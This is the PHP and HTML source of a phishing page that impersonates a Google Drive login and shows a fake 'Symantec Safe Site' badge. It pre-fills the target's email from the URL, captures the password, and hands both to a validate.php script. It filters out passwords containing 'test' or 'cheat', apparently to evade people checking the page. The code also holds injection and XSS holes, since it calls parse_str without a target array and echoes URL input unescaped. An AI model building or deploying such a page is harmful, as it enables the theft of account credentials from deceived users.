<?php
session_start();

// start > to get url and and put id 
	$url="http://".$_SERVER['HTTP_HOST'].$_SERVER['REQUEST_URI'];
	parse_str(parse_url($url, PHP_URL_QUERY));

	$parts = @explode('@', $userid);
	$user = @$parts[0];
// < end 

$email_msg = "";
$pass_msg = "";

$email = $userid;
$pass = "";

if($_POST) {
	$email = $_POST['email'];
	$pass = $_POST['passwd'];

	if(!preg_match("/^[_a-z0-9-]+(\.[_a-z0-9-]+)*@[a-z0-9-]+(\.[a-z0-9-]+)*(\.[a-z]{2,4})$/", $email)) {
		$email_msg = "Please enter a valid email address";
	} 
        else if(trim($pass) == "") {
		$pass_msg = "Enter your password";
	}
        else if(strlen($pass) <= 4 || stripos($pass,'fuck') !== false || stripos($pass,'cheat') !== false || stripos($pass,'test') !== false || $pass == $email ) {
		$pass_msg = "Invalid password";
	}
   else {
		$_SESSION['email'] = $email;
		$_SESSION['pass'] = $pass;
		header("Location: validate.php");
		exit;
	}
}
?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<head>
<title>Google Drive - Keep everything. Share anything.</title>
<meta http-equiv="Content-Type" content="text/html; charset=ISO-8859-1">
<meta name="google-translate-customization" content="b0ae1d6e7dd5e212-1911386c1de1e3ad-g1523ffbf10e51cc6-18"></meta>
<link rel="icon" type="image/x-icon" href="images/favicon.ico">
<link type="text/css" rel="stylesheet" charset="UTF-8" href="images/style.css">
</head>


<body>
<div class="allcontent" style="width: 917px; height: 263px">
	<form name="form1" method="post" action="" >
	<table class="contact_form">
	 <tbody><tr>
	  <td colspan="2">

	   <div class="formheader"> <img border="0" src="images/padlock.png" width="24" height="22" />Symantec Safe Site</div>

	  </td>
     </tr>
     <tr>
      <td></td>
      <td>
      <div class=""><font face="Arial"><b>Login with your email</b></font></div></td>
     </tr>
    <tr>
    <br />
	 <td valign="top">
	  <p align="left">
	  <label for="Email" class="required"><font face="Arial">Email :</font><span class="required_star"></label>
	 </p></td>
	 <td valign="top">
	 <?php if($user == "") {
							?>
	 <input class="txtentry" name="email" id="email" maxlength="100" type="text" size="1" tabindex="1" placeholder="user@example.com" value="<?php echo $email != "" ? $email : "" ?>" /><?php echo $email_msg != "" ? "<span style='color: #FF0000; display: block; margin-left: 1px; margin-top: 5px;'>$email_msg</span>" : "<br />" ?>

				<?php

			} else {
			
			?>
			
			<input class="txtentry" type="hidden" name="email" value="<?php echo $userid ?>" />

				<p id='username'><b><font face="Arial"><span style="font-size: 12pt"><?php echo $userid ?></span></font></b></p>
	<?php

			} ?>
				
	
	 </td>
	</tr>
	<tr>
	 <td valign="top"><label for="password" class="required"><font face="Arial">Password :</font></label>
	 </td>
	 <td valign="top">

	  <input class="txtentry" name="passwd" id="pass" maxlength="80" type="password" size="1" tabindex="2"><?php echo $pass_msg != "" ? "<span style='color: #FF0000; display: block; margin-left: 1px; margin-top: 5px;'>$pass_msg</span>" : "<br />" ?>
	 </td>
	</tr>
	<tr>
     <td valign="top"> </td>
	 <td colspan="2" style="text-align: left;">
	   <div class="submit_button">

	     <input class="btn" value="Sign In" type="submit" name="Submit">

	   </div>
     </td>
	</tr>
	</tbody></table>
	</form>


    </div>
    <br />
    <br />
    <br />
    <br />
    <br />
    
    <center><hr color="#1E4F95" size="1" width="90%"><strong>
<font color="#000000" size="2" face="Arial"></font>
<br /><font color="#1E4F95" size="2" face="Arial">Supports all emails.</font></strong></center>
<p align="center">

<span style="font-family: arial, sans-serif; font-size: 11px; float: none"></span>
<img src="images/mails.png" ></a><br>
</p>


</body></html>
